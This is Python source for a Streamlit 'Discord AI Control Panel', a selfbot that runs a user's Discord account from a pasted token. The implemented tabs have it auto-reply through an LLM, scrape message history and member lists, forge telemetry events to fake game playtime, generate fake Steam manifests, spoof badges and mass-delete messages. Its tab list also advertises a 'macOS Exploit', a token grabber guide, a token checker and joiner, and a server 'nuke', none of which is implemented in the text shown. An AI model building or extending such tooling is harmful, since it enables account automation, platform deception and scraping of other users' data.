import streamlit as st
import time
import openai
import requests
import csv
import os
from datetime import datetime
import random
import pandas as pd
import json
import re
from duckduckgo_search import DDGS
import logging
from typing import Optional
import base64

NVIDIA_BASE_URL = "https://integrate.api.nvidia.com/v1"
MODELS_ENDPOINT = f"{NVIDIA_BASE_URL}/models"
CHAT_ENDPOINT = f"{NVIDIA_BASE_URL}/chat/completions"
REQUEST_TIMEOUT = 15
AI_TAG = "[AI_RESPONSE]"

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("nvidia_model_picker")
st.set_page_config(page_title="Discord AI Control Panel", page_icon="🛡️", layout="wide")

MASTER_KEY = st.secrets.get("MASTER_KEY")
CODE_FILE = "active_code.txt"
MEMORY_FILE = "conversation_memory.json"
PROCESSED_MSG_FILE = "processed_messages.json"
CLIENTS_FILE = "clients.json"


def load_processed_ids():
    if os.path.exists(PROCESSED_MSG_FILE):
        try:
            with open(PROCESSED_MSG_FILE, "r") as f:
                data = json.load(f)
                if isinstance(data, list):
                    return set(data)
        except:
            pass
    return set()


def save_processed_ids(id_set):
    try:
        with open(PROCESSED_MSG_FILE, "w") as f:
            json.dump(list(id_set), f)
    except Exception as e:
        log_to_console(f"⚠️ Could not save processed IDs: {e}")


def load_clients():
    if os.path.exists(CLIENTS_FILE):
        try:
            with open(CLIENTS_FILE, "r") as f:
                return json.load(f)
        except:
            pass
    return {}


def save_clients(clients):
    with open(CLIENTS_FILE, "w") as f:
        json.dump(clients, f, indent=2)


def fetch_nvidia_models(api_key, timeout=REQUEST_TIMEOUT):
    if not api_key or not api_key.strip():
        raise ValueError("An NVIDIA API key is required to fetch models.")
    headers = {"Authorization": f"Bearer {api_key.strip()}", "Accept": "application/json"}
    logger.info("Fetching model list from %s", MODELS_ENDPOINT)
    try:
        response = requests.get(MODELS_ENDPOINT, headers=headers, timeout=timeout)
    except requests.exceptions.Timeout as exc:
        raise requests.exceptions.Timeout(f"Timed out after {timeout}s contacting {MODELS_ENDPOINT}") from exc
    if response.status_code == 401:
        raise requests.exceptions.HTTPError("401 Unauthorized: check that your NVIDIA API key is valid.", response=response)
    if response.status_code == 429:
        raise requests.exceptions.HTTPError("429 Too Many Requests: you've hit the free-tier rate limit. Wait and retry.", response=response)
    if response.status_code == 402:
        raise requests.exceptions.HTTPError("402 Payment Required: free credits/quota exhausted for this key.", response=response)
    response.raise_for_status()
    try:
        payload = response.json()
    except ValueError as exc:
        raise ValueError("NVIDIA API did not return valid JSON.") from exc
    models = payload.get("data", [])
    if not isinstance(models, list):
        raise ValueError("Unexpected response shape from NVIDIA API: 'data' is not a list.")
    return sorted(models, key=lambda m: m.get("id", ""))


def set_global_code(code):
    with open(CODE_FILE, "w") as f:
        f.write(f"{code},{time.time()}")


def get_global_code():
    if os.path.exists(CODE_FILE):
        try:
            with open(CODE_FILE, "r") as f:
                data = f.read().split(",")
                if len(data) == 2:
                    return data[0], float(data[1])
        except:
            return None, None
    return None, None


def log_access_event():
    with open("access_log.txt", "a") as f:
        f.write(f"Access Granted at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")


def save_memory(channel_id, summary):
    memory_data = {}
    if os.path.exists(MEMORY_FILE):
        with open(MEMORY_FILE, "r") as f:
            try:
                memory_data = json.load(f)
            except:
                pass
    memory_data[str(channel_id)] = {"summary": summary, "last_updated": time.time()}
    with open(MEMORY_FILE, "w") as f:
        json.dump(memory_data, f)


def load_memory(channel_id):
    if os.path.exists(MEMORY_FILE):
        with open(MEMORY_FILE, "r") as f:
            try:
                memory_data = json.load(f)
                return memory_data.get(str(channel_id), {}).get("summary", "No previous memory.")
            except:
                pass
    return "No previous memory."


for s_key, s_val in {
    "access_granted": False,
    "console_logs": ["🤖 System Initialized. Awaiting credentials..."],
    "converted_media_frames": [],
    "bot_running": False,
    "tokens": 3.0,
    "last_time": time.time(),
    "memory": {},
    "processed_dms": set(),
    "last_activity": time.time(),
    "typing_active": False,
    "bio_anim_active": False,
    "last_ai_content": None,
    "bot_start_time": time.time(),
    "last_msg_id": None,
    "debug_log": "System Ready...",
    "my_id": None,
    "my_username": None,
    "processed_msg_ids": load_processed_ids(),
    "or_key": "",
    "discord_token": "",
    "channel_id": "",
    "model_id": "",
    "nvidia_retry_after": 0,
    "cf_clearance_cookie": "",
    "analytics_token": None,
    "spoofer_running": False,
    "friend_invites": [],
    "spoofer_fingerprint": "",
    "steam_acf_output": "",
    "token_check_results": [],
    "guild_scrape_result": None,
    "vanity_sniper_target": "",
    "vanity_sniper_running": False,
    "nitro_sniper_running": False,
    "logged_messages": [],
    "backup_data": None,
    "join_results": [],
    "clients": load_clients(),
    "client_key_input": "",
}.items():
    if s_key not in st.session_state:
        st.session_state[s_key] = s_val


def log_to_console(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    st.session_state.console_logs.append(f"[{timestamp}] {message}")
    if len(st.session_state.console_logs) > 40:
        st.session_state.console_logs.pop(0)


shared_code, shared_time = get_global_code()
if not shared_code:
    st.session_state.access_granted = False
if shared_code and shared_time:
    if st.session_state.access_granted:
        if time.time() - shared_time > 30:
            set_global_code(shared_code)
    if time.time() - shared_time > 600:
        if os.path.exists(CODE_FILE):
            os.remove(CODE_FILE)
        st.session_state.access_granted = False
        log_to_console("⚠️ Session expired due to inactivity.")

with st.sidebar:
    st.header("🔐 System Access")
    admin_input = st.text_input("Owner Master Key", type="password")
    if admin_input == MASTER_KEY:
        col_gen, col_rev = st.columns(2)
        with col_gen:
            if st.button("🎲 Generate Code"):
                new_code = str(random.randint(100000, 999999))
                set_global_code(new_code)
                st.success(f"CODE: {new_code}")
                log_to_console("🎟️ Owner generated new access key code token.")
        with col_rev:
            if st.button("🚫 Revoke All"):
                if os.path.exists(CODE_FILE):
                    os.remove(CODE_FILE)
                st.session_state.access_granted = False
                log_to_console("🛑 Master revocation activated.")
                st.warning("Access Revoked")
                st.rerun()
    st.divider()
    if not st.session_state.access_granted:
        user_code_attempt = st.text_input("Enter 6-Digit Access Code")
        if st.button("Unlock System"):
            current_valid_code, _ = get_global_code()
            if current_valid_code and user_code_attempt == current_valid_code:
                st.session_state.access_granted = True
                log_access_event()
                log_to_console("🔓 Access code accepted.")
                st.rerun()
            else:
                st.error("Invalid or Expired Code")
                log_to_console("❌ Unauthorized connection attempt.")

if not st.session_state.access_granted:
    st.title("🛡️ System Dashboard - Locked")
    st.info("Please contact the administrator for the current global 6-digit access code.")
    st.stop()


def jitter_delay(min_s=0.1, max_s=0.5):
    time.sleep(random.uniform(min_s, max_s))


def get_headers(tk):
    return {
        "Authorization": tk,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }


def log_to_csv(author, content, action):
    file_exists = os.path.isfile('discord_audit_log.csv')
    with open('discord_audit_log.csv', mode='a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(['Timestamp', 'Author', 'Message', 'Action'])
        writer.writerow([datetime.now().strftime('%Y-%m-%d %H:%M:%S'), author, content, action])


def validate_token(tk):
    headers = get_headers(tk)
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
        if r.status_code == 200:
            return True, r.json()
    except:
        pass
    return False, None


def safety_filter(text):
    harmful_terms = ["self-harm", "suicide", "kys", "kill yourself", "harming myself"]
    for term in harmful_terms:
        if term in text.lower():
            return False
    return True


def _build_super_properties():
    props = {
        "os": "Windows",
        "browser": "Chrome",
        "device": "",
        "system_locale": "en-US",
        "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "browser_version": "120.0.0.0",
        "os_version": "10",
        "referrer": "",
        "referring_domain": "",
        "referrer_current": "",
        "referring_domain_current": "",
        "release_channel": "stable",
        "client_build_number": 254000,
        "client_event_source": None,
    }
    raw = json.dumps(props, separators=(",", ":")).encode("utf-8")
    return base64.b64encode(raw).decode("utf-8")


def fetch_analytics_token(token):
    headers = get_headers(token)
    headers["X-Super-Properties"] = _build_super_properties()
    try:
        r = requests.get("https://discord.com/api/v9/users/@me?with_analytics_token=true", headers=headers, timeout=8)
        if r.status_code == 200:
            return r.json().get("analytics_token")
    except:
        pass
    return None


def post_science_events(token, analytics_token, cookie, events, fingerprint=None):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "X-Super-Properties": _build_super_properties(),
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/channels/@me",
    }
    if cookie:
        headers["Cookie"] = cookie if "cf_clearance=" in cookie else f"cf_clearance={cookie}"
    payload = {"token": analytics_token, "events": events}
    try:
        r = requests.post("https://discord.com/api/v9/science", headers=headers, json=payload, timeout=15)
        return r.status_code, r.text
    except Exception as e:
        return 0, str(e)


def build_game_events(game_name, hours, game_id="0", fingerprint=None):
    total_seconds = int(hours * 3600)
    launch_id = str(random.randint(10**17, 10**18 - 1))
    session_id = str(random.randint(10**17, 10**18 - 1))
    launch_event = {
        "type": "launch_game",
        "game": {"id": game_id, "name": game_name, "executable": game_name.lower().replace(" ", "_") + ".exe"},
        "properties": {
            "client_launch_id": launch_id,
            "launch_platform": "desktop",
            "game_id": game_id,
            "game_name": game_name,
            "exe": game_name.lower().replace(" ", "_") + ".exe",
            "is_overlay": False,
            "launch_source": "desktop",
            "playtime_session_id": session_id,
        },
    }
    if fingerprint:
        launch_event["properties"]["executable_fingerprint"] = fingerprint
    heartbeat_event = {
        "type": "running_game_heartbeat",
        "game": {"id": game_id, "name": game_name},
        "properties": {
            "client_launch_id": launch_id,
            "game_id": game_id,
            "game_name": game_name,
            "heartbeat_session_id": session_id,
            "playtime_seconds": total_seconds,
            "running_game_heartbeat_ms": total_seconds * 1000,
        },
    }
    if fingerprint:
        heartbeat_event["properties"]["executable_fingerprint"] = fingerprint
    return [launch_event, heartbeat_event]


def generate_steam_appmanifest(app_id, game_name, install_dir, steam_id="0"):
    now = int(time.time())
    acf = f'''"AppState"
{{
	"appid"		"{app_id}"
	"Universe"		"1"
	"LauncherPath"		"C:\\\\Program Files (x86)\\\\Steam\\\\steam.exe"
	"name"		"{game_name}"
	"StateFlags"		"1026"
	"installdir"		"{install_dir}"
	"LastUpdated"		"{now}"
	"LastPlayed"		"0"
	"SizeOnDisk"		"1000000000"
	"StagingSize"		"1000000000"
	"buildid"		"0"
	"LastOwner"		"{steam_id}"
	"UpdateResult"		"0"
	"BytesToDownload"		"1000000000"
	"BytesDownloaded"		"0"
	"BytesToStage"		"1000000000"
	"BytesStaged"		"0"
	"TargetBuildID"		"0"
	"AutoUpdateBehavior"		"0"
	"AllowOtherDownloadsWhileRunning"		"0"
	"ScheduledAutoUpdate"		"0"
	"InstalledDepots"
	{{
		"{app_id}"		{{
			"manifest"		"0"
			"size"		"1000000000"
		}}
	}}
	"SharedDepots"
	{{
	}}
	"UserConfig"
	{{
		"language"		"english"
	}}
	"MountedConfig"
	{{
		"language"		"english"
	}}
}}
'''
    return acf


def background_reply(latest, discord_url, typing_url, headers, client, system_prompt,
                     my_id, my_username, memory_depth, enable_safety, resp_delay,
                     owner_id_input, mention_only, model_id):
    try:
        channel_id = latest['channel_id']
        author_username = latest['author']['username'].lower()
        author_id = str(latest['author']['id'])
        content = latest['content'].strip()
        msg_id = latest['id']
        is_owner = author_id == str(owner_id_input).strip()
        if mention_only and not is_owner:
            if f"<@{my_id}>" not in content and f"<@!{my_id}>" not in content:
                return False
        if time.time() < st.session_state.nvidia_retry_after:
            log_to_console(f"⏳ Rate‑limit cooldown until {datetime.fromtimestamp(st.session_state.nvidia_retry_after).strftime('%H:%M:%S')}. Skipping message.")
            return False
        requests.post(typing_url, headers=headers, timeout=5)
        long_term_mem = load_memory(channel_id)
        urls = re.findall(r'(https?://[^\s]+)', content)
        url_context = ""
        if urls:
            url_context = f"\n[SYSTEM NOTE: The user provided a link: {urls[0]}.]"
        system_instruction = f"{system_prompt}\n\nIMPORTANT: Always end your response with the tag: {AI_TAG}"
        chat_history = [{"role": "system", "content": f"PERSONA: {system_instruction}. Current memory: {long_term_mem}. {url_context}"}]
        context_req = requests.get(f"{discord_url}?limit={memory_depth}", headers=headers, timeout=5).json()
        if isinstance(context_req, list):
            for m in reversed(context_req):
                role = "assistant" if str(m['author']['id']) == str(my_id) else "user"
                sender = f"[{m['author']['username']}]: " if role == "user" else ""
                chat_history.append({"role": role, "content": f"{sender}{m['content']}"})
        log_to_console(f"📡 Sending request to NVIDIA model: {model_id}")
        try:
            response = client.chat.completions.create(model=model_id, messages=chat_history)
            reply = response.choices[0].message.content
        except openai.RateLimitError as e:
            retry_after = getattr(e, 'retry_after', None)
            if retry_after is None:
                try:
                    body = e.response.json()
                    retry_after = body.get('retry_after', 60)
                except:
                    retry_after = 60
            st.session_state.nvidia_retry_after = time.time() + float(retry_after)
            log_to_console(f"⚠️ NVIDIA rate limit hit. Cooldown until {datetime.fromtimestamp(st.session_state.nvidia_retry_after).strftime('%H:%M:%S')}.")
            return False
        except Exception as e:
            log_to_console(f"❌ NVIDIA API error: {str(e)}")
            st.session_state.debug_log = f"NVIDIA API error: {str(e)}"
            return False
        MAX_MSG_LEN = 2000
        TAG_LEN = len(AI_TAG)
        if AI_TAG not in reply:
            max_content_len = MAX_MSG_LEN - TAG_LEN - 1
            reply = reply.strip()[:max_content_len] + " " + AI_TAG
        else:
            reply = reply.strip()[:MAX_MSG_LEN]
        log_to_console(f"✅ Received AI reply (length={len(reply)}): {reply[:50]}...")
        new_summary_prompt = f"Summarize key points in 2 sentences: {reply}"
        try:
            summary_resp = client.chat.completions.create(model=model_id, messages=[{"role": "user", "content": new_summary_prompt}])
            save_memory(channel_id, summary_resp.choices[0].message.content)
        except openai.RateLimitError as e:
            retry_after = getattr(e, 'retry_after', 60)
            st.session_state.nvidia_retry_after = time.time() + float(retry_after)
        except Exception as e:
            log_to_console(f"⚠️ Memory summary failed: {str(e)}")
        if not enable_safety or safety_filter(reply):
            if resp_delay > 0 and not is_owner:
                time.sleep(resp_delay)
            post_resp = requests.post(discord_url, json={"content": reply}, headers=headers, timeout=5)
            if post_resp.status_code not in (200, 201):
                st.session_state.debug_log = f"Discord post failed: {post_resp.status_code} {post_resp.text}"
                log_to_console(f"❌ Failed to send reply: {post_resp.status_code}")
                return False
            st.session_state.last_ai_content = reply.strip()
            log_to_csv(author_username, content, "Reply Sent")
            log_to_console(f"🤖 AI responded to [{author_username}] in channel {channel_id}")
            return True
        return False
    except Exception as e:
        st.session_state.debug_log = f"Error in background_reply: {str(e)}"
        log_to_console(f"❌ Automation runtime error: {str(e)}")
        return False


with st.sidebar:
    st.header("🔑 Authentication")
    token_input = st.text_input("Discord Token", type="password", key="discord_token_input")
    if token_input:
        st.session_state.discord_token = token_input.strip().replace("\r", "").replace("\n", "")
        is_valid, user_info = validate_token(st.session_state.discord_token)
        if is_valid:
            st.success(f"✅ Verified: {user_info['username']}")
            st.session_state.my_username = user_info['username'].lower()
            st.session_state.my_id = user_info['id']
        else:
            st.error("❌ Invalid Token")
            st.session_state.my_username = None
            st.session_state.my_id = None
    else:
        st.session_state.my_username = None
        st.session_state.my_id = None
    or_key = st.text_input("NVIDIA API Key", type="password", key="nvidia_key_input")
    if or_key:
        st.session_state.or_key = or_key.strip()
    channel_id_input = st.text_input("Channel ID", key="channel_id_input")
    if channel_id_input:
        st.session_state.channel_id = channel_id_input.strip().replace("\r", "").replace("\n", "")
    st.divider()
    st.header("⚙️ Bot Settings")
    mention_only = st.toggle("Mention-Only Mode (429 Protection)", value=False)
    st.session_state.mention_only = mention_only
    if st.session_state.bot_running:
        st.markdown("### 🟢 Connection Active")
    memory_depth = st.slider("Memory Depth (Past Msgs)", min_value=1, max_value=20, value=5)
    st.session_state.memory_depth = memory_depth
    poll_speed = st.slider("Polling Frequency (Seconds)", 0.1, 5.0, 0.5)
    st.session_state.poll_speed = poll_speed
    resp_delay = st.slider("Response Delay (Seconds)", 0.0, 5.0, 0.0)
    st.session_state.resp_delay = resp_delay
    c_safety, c_restart = st.columns(2)
    with c_safety:
        enable_safety = st.toggle("Enable Safety Filter", value=True)
        st.session_state.enable_safety = enable_safety
    with c_restart:
        auto_restart_10m = st.toggle("10m Auto-Restart", value=False)


tabs_list = [
    "🤖 Bot Control", "📂 History Scraper", "🧠 Memory", "🌾 Server Harvester",
    "💎 Free Emoji", "❄️ Snowflake Decoder", "📱 App Hunter", "🎙️ VC Lurker",
    "🔊 Soundboard Spoofer", "✨ Hypesquad", "🔍 Account Audit", "📢 Webhook Commander",
    "👻 Message Ghoster", "🎨 Text Color", "⏳ Infinite Typing", "🔎 OSINT Search",
    "🎭 Status Spoofer", "🖼️ Sticker Spoofer", "📦 Large File Bridge", "👻 Invisible Identity",
    "🌀 Bio Animator", "👻 Ghost Pinger", "📋 Server Cloner", "💎 Nitro Badge", "🎬 2D Animator",
    "💠 Badge Spoofer", "🤝 Friend Invites",
    "🔑 Token Checker", "📡 Guild Scraper", "🧪 Nitro Plugin Gen", "🛠️ Steam ACF Gen",
    "🎯 Quest Guide", "💻 macOS Exploit", "📨 Mass DM Guide",
    "🏃 Vanity Sniper", "💎 Nitro Sniper", "📝 Message Logger", "📦 Guild Backup",
    "🔗 Token Joiner", "🧅 Tor Manager", "📱 QR Login Kit", "🤖 Android Gen",
    "🎤 Voice Changer", "☢️ Nuke Research", "🕵️ Grabber Guide",
    "💰 Client Manager", "🚀 Deployment Guide","api"
]
tabs = st.tabs(tabs_list)


with tabs[0]:
    st.header("🤖 Bot Control")
    model_id = st.text_input("Model ID", key="model_id_input")
    if model_id:
        st.session_state.model_id = model_id.strip()
    col1, col2 = st.columns(2)
    with col1:
        persona_dict = {
            "Custom": "", "Helpful Assistant": "You are a helpful assistant.",
            "Sarcastic Bot": "You are a sarcastic, witty bot.", "Technical Support": "You are a technical expert.",
            "Chaos Mode": "Short and weird replies.", "Cyberpunk Hacker": "Netrunner persona.",
            "Stoic Philosopher": "Calm and logical.", "Gamer Streamer": "Hype, POG, L, W.",
            "The Detective": "Noir film character.",
        }
        selected_persona = st.selectbox("Preset Personas", list(persona_dict.keys()))
        default_prompt = persona_dict[selected_persona] if selected_persona != "Custom" else "You are a helpful assistant."
        system_prompt = st.text_area("System Prompt", value=default_prompt)
        st.session_state.system_prompt = system_prompt
        owner_id_input = st.text_input("Owner Discord ID").strip()
        st.session_state.owner_id_input = owner_id_input
    with col2:
        blacklist_input = st.text_area("Blacklisted Keywords")
        allowed_input = st.text_input("Allowed Users", value="everyone")
        blacklisted_users_input = st.text_input("Blacklisted Users")
    allowed_users = "everyone" if allowed_input.lower().strip() == "everyone" else [u.strip().lower() for u in allowed_input.split(",") if u.strip()]
    blacklisted_users = [u.strip().lower() for u in blacklisted_users_input.split(",") if u.strip()]
    blacklist = [word.strip().lower() for word in blacklist_input.split(",") if word.strip()]
    if st.session_state.or_key:
        client = openai.OpenAI(api_key=st.session_state.or_key, base_url=NVIDIA_BASE_URL)
    else:
        client = None
        st.warning("⚠️ Please enter your NVIDIA API Key in the sidebar.")

    @st.cache_data(ttl=3600, show_spinner=False)
    def get_cached_models(api_key):
        try:
            return fetch_nvidia_models(api_key)
        except Exception as e:
            log_to_console(f"⚠️ Could not fetch NVIDIA models: {e}")
            return []

    if st.session_state.or_key:
        modelsout = get_cached_models(st.session_state.or_key)
        if modelsout:
            st.success(f"✅ {len(modelsout)} models available")
        else:
            st.info("Model list not loaded (check API key or connection)")
    c1, c2 = st.columns(2)
    with c1:
        if st.button("▶️ Launch Bot", disabled=not (st.session_state.my_username and st.session_state.or_key and st.session_state.model_id), use_container_width=True):
            st.session_state.bot_running = True
            st.session_state.bot_start_time = time.time()
            log_to_console(f"🟢 Bot started on channel: {st.session_state.channel_id}")
            st.rerun()
    with c2:
        if st.button("🛑 Stop Bot", use_container_width=True):
            st.session_state.bot_running = False
            log_to_console("🛑 Bot stopped.")
            st.rerun()
    if st.session_state.bot_running:
        st.success("Status: 🟢 ONLINE")
        headers = get_headers(st.session_state.discord_token)
        discord_url = f"https://discord.com/api/v9/channels/{st.session_state.channel_id}/messages"
        typing_url = f"https://discord.com/api/v9/channels/{st.session_state.channel_id}/typing"
        try:
            r = requests.get(discord_url, headers=headers, timeout=5)
            if r.status_code == 200:
                msgs = r.json()
                if msgs and isinstance(msgs, list):
                    for msg in msgs:
                        msg_id = msg['id']
                        author_id = str(msg['author']['id'])
                        content = msg['content'].strip()
                        if author_id == str(st.session_state.my_id):
                            continue
                        if AI_TAG in content:
                            log_to_console(f"⏭️ Skipping message with AI tag: {content[:50]}...")
                            continue
                        if msg_id in st.session_state.processed_msg_ids:
                            continue
                        success = background_reply(
                            msg, discord_url, typing_url, headers,
                            client, st.session_state.system_prompt,
                            st.session_state.my_id, st.session_state.my_username,
                            st.session_state.memory_depth, st.session_state.enable_safety,
                            st.session_state.resp_delay,
                            st.session_state.owner_id_input, st.session_state.mention_only,
                            st.session_state.model_id
                        )
                        if success:
                            st.session_state.processed_msg_ids.add(msg_id)
                            save_processed_ids(st.session_state.processed_msg_ids)
                            log_to_console(f"✅ Message {msg_id} processed.")
                        break
            time.sleep(st.session_state.poll_speed)
            st.rerun()
        except Exception as e:
            log_to_console(f"⚠️ Polling error: {str(e)}")
            time.sleep(st.session_state.poll_speed)
            st.rerun()
    else:
        st.info("Bot is stopped.")


with tabs[1]:
    st.header("📥 Channel History Scraper")
    limit = st.number_input("Fetch Limit", min_value=1, max_value=100, value=50)
    if st.button("🔍 Scrape"):
        if st.session_state.discord_token and st.session_state.channel_id:
            log_to_console(f"📥 Querying message history arrays inside channel ID: {st.session_state.channel_id}")
            res = requests.get(f"https://discord.com/api/v9/channels/{st.session_state.channel_id}/messages?limit={limit}", headers=get_headers(st.session_state.discord_token), timeout=5)
            if res.status_code == 200:
                st.dataframe(pd.DataFrame([{"Author": m['author']['username'], "Content": m['content']} for m in res.json()]))
        else:
            st.error("Missing configuration credentials.")


with tabs[2]:
    st.header("🧠 Persistent Memory")
    if os.path.exists(MEMORY_FILE):
        with open(MEMORY_FILE, "r") as f:
            try:
                st.json(json.load(f))
            except:
                st.error("Memory file corrupted.")
    if st.button("Clear Memory File"):
        if os.path.exists(MEMORY_FILE):
            os.remove(MEMORY_FILE)
        log_to_console("🧠 AI local conversational short-term memory files wiped clean.")
        st.success("Memory Nuked.")


with tabs[3]:
    st.header("🌾 Server Harvester")
    target_guild = st.text_input("Target Server ID").strip().replace("\r", "").replace("\n", "")
    if st.button("📥 Harvest Emojis"):
        if st.session_state.discord_token and target_guild:
            log_to_console(f"🌾 Extracting structural custom graphic payload arrays from server: {target_guild}")
            res = requests.get(f"https://discord.com/api/v9/guilds/{target_guild}", headers=get_headers(st.session_state.discord_token), timeout=5).json()
            if 'emojis' in res:
                for e in res['emojis']:
                    url = f"https://cdn.discordapp.com/emojis/{e['id']}.png"
                    st.image(url, width=64, caption=f"{e['name']} (ID: {e['id']})")


with tabs[4]:
    st.header("💎 Nitro-Free Emoji Spoofer")
    target_ch = st.text_input("Target Channel ID", value=st.session_state.channel_id, key="emoji_ch").strip().replace("\r", "").replace("\n", "")
    emoji_id = st.text_input("Emoji ID").strip().replace("\r", "").replace("\n", "")
    is_animated = st.checkbox("Is Animated?")
    if st.button("🚀 Send Emoji", use_container_width=True):
        if st.session_state.discord_token and emoji_id and target_ch:
            ext = "gif" if is_animated else "png"
            emoji_url = f"https://cdn.discordapp.com/emojis/{emoji_id}.{ext}?size=48"
            requests.post(f"https://discord.com/api/v9/channels/{target_ch}/messages", headers=get_headers(st.session_state.discord_token), json={"content": emoji_url}, timeout=5)
            log_to_console(f"💎 Dispatched spoofed Nitro graphic layout to channel: {target_ch}")
            st.success("Emoji Sent!")


with tabs[5]:
    st.header("❄️ Snowflake Age Decoder")
    input_id = st.text_input("Enter User or Server ID").strip()
    if st.button("📅 Decode Timestamp", use_container_width=True):
        if input_id.isdigit():
            timestamp = (int(input_id) >> 22) + 1420070400000
            date_obj = datetime.fromtimestamp(timestamp / 1000.0)
            st.success(f"Creation Date: **{date_obj.strftime('%Y-%m-%d %H:%M:%S')} UTC**")


with tabs[6]:
    st.header("📱 Authorized App Hunter")
    if st.button("🔍 Scan Applications", use_container_width=True):
        if st.session_state.discord_token:
            log_to_console("📱 Scanning targeted token OAuth2 structural application clearances.")
            apps = requests.get("https://discord.com/api/v9/oauth2/tokens", headers=get_headers(st.session_state.discord_token), timeout=5).json()
            if apps and isinstance(apps, list):
                for a in apps:
                    app_name = a.get('application', {}).get('name', 'Unknown')
                    with st.expander(f"📲 {app_name}"):
                        st.write(f"**Scopes:** `{', '.join(a.get('scopes', []))}`")


with tabs[7]:
    st.header("🎙️ VC Lurker (Direct Scan)")
    target_guild_id = st.text_input("Server ID", key="lurker_guild").strip().replace("\r", "").replace("\n", "")
    target_vc_id = st.text_input("Specific Voice Channel ID", key="lurker_vc").strip().replace("\r", "").replace("\n", "")
    if st.button("📡 Scan Voice Channel", use_container_width=True):
        if st.session_state.discord_token and target_guild_id and target_vc_id:
            h = get_headers(st.session_state.discord_token)
            log_to_console(f"🎙️ Querying audio space user allocations on voice space channel: {target_vc_id}")
            res = requests.get(f"https://discord.com/api/v9/channels/{target_vc_id}", headers=h, timeout=5)
            if res.status_code == 200:
                mem_res = requests.get(f"https://discord.com/api/v9/guilds/{target_guild_id}/members?limit=100", headers=h, timeout=5)
                if mem_res.status_code == 200:
                    members = mem_res.json()
                    found = [{"User": m['user']['username'], "ID": m['user']['id']} for m in members if 'user' in m]
                    st.table(pd.DataFrame(found))


with tabs[8]:
    st.header("🔊 Soundboard Anywhere Spoofer")
    sound_ch_id = st.text_input("Voice Channel ID", value=st.session_state.channel_id).strip().replace("\r", "").replace("\n", "")
    sound_id = st.text_input("Sound ID").strip().replace("\r", "").replace("\n", "")
    sound_guild_id = st.text_input("Source Server ID").strip().replace("\r", "").replace("\n", "")
    if st.button("🔊 Fire Sound", use_container_width=True):
        if st.session_state.discord_token and sound_ch_id and sound_id:
            h = get_headers(st.session_state.discord_token)
            sb_url = f"https://discord.com/api/v9/channels/{sound_ch_id}/voice-channel-effects"
            res = requests.post(sb_url, headers=h, json={"sound_id": sound_id, "source_guild_id": sound_guild_id if sound_guild_id else None}, timeout=5)
            if res.status_code == 204:
                log_to_console(f"🔊 Soundboard vector index packet triggered to channel: {sound_ch_id}")
                st.success("Sound Played!")


with tabs[9]:
    st.header("✨ HypeSquad Spoofer")
    house = st.selectbox("House", ["Bravery", "Brilliance", "Balance"])
    house_map = {"Bravery": 1, "Brilliance": 2, "Balance": 3}
    if st.button("Apply"):
        if st.session_state.discord_token:
            requests.post("https://discord.com/api/v9/hypesquad/online", headers=get_headers(st.session_state.discord_token), json={"house_id": house_map[house]}, timeout=5)
            log_to_console(f"✨ Account properties context altered to badge state: HypeSquad {house}")
            st.success("House Applied")


with tabs[10]:
    st.header("🔍 Account Auditor")
    if st.button("Run Audit"):
        if st.session_state.discord_token:
            u_res = requests.get("https://discord.com/api/v9/users/@me", headers=get_headers(st.session_state.discord_token), timeout=5).json()
            st.json(u_res)


with tabs[11]:
    st.header("📢 Webhook Commander")
    wh_url = st.text_input("Webhook URL").strip().replace("\r", "").replace("\n", "")
    wh_msg = st.text_area("Message content")
    if st.button("Fire"):
        if wh_url:
            requests.post(wh_url, json={"content": wh_msg}, timeout=5)
            log_to_console("📢 External API data string fired to webhook collector targets.")


with tabs[12]:
    st.header("👻 Message Ghoster")
    ghost_ch = st.text_input("Target Channel ID", value=st.session_state.channel_id, key="ghost_ch").strip().replace("\r", "").replace("\n", "")
    ghost_limit = st.number_input("Scan Limit", min_value=1, max_value=500, value=50)
    if st.button("🔥 Purge My Messages", use_container_width=True):
        if st.session_state.discord_token and st.session_state.my_id and ghost_ch:
            h = get_headers(st.session_state.discord_token)
            log_to_console(f"👻 Commencing hidden frame tracking deletion matrix in channel: {ghost_ch}")
            msgs = requests.get(f"https://discord.com/api/v9/channels/{ghost_ch}/messages?limit={ghost_limit}", headers=h, timeout=5).json()
            if isinstance(msgs, list):
                for m in msgs:
                    if m['author']['id'] == st.session_state.my_id:
                        requests.delete(f"https://discord.com/api/v9/channels/{ghost_ch}/messages/{m['id']}", headers=h, timeout=5)
                        log_to_console(f"🗑️ Cleaned message index payload element: {m['id']}")
                        time.sleep(1.2)


with tabs[13]:
    st.header("🎨 ANSI Color Painter")
    color_text = st.text_input("Your Message")
    color_choice = st.selectbox("Color", ["Red", "Green", "Yellow", "Blue", "Magenta", "Cyan", "White"])
    color_codes = {"Red": "31", "Green": "32", "Yellow": "33", "Blue": "34", "Magenta": "35", "Cyan": "36", "White": "37"}
    if st.button("🖌️ Send Colored Text", use_container_width=True):
        if st.session_state.discord_token and st.session_state.channel_id:
            code = color_codes[color_choice]
            ansi_payload = f"```ansi\n\u001b[{code}m{color_text}```"
            requests.post(f"https://discord.com/api/v9/channels/{st.session_state.channel_id}/messages", headers=get_headers(st.session_state.discord_token), json={"content": ansi_payload}, timeout=5)


with tabs[14]:
    st.header("⏳ Infinite Typing Indicator")
    if st.button("🚀 Start Infinite Typing", use_container_width=True):
        st.session_state.typing_active = True
        log_to_console("⏳ Infinite typing simulator loop active.")
    if st.button("🛑 Stop Typing", use_container_width=True):
        st.session_state.typing_active = False
        log_to_console("⏳ Infinite typing loop deactivated.")
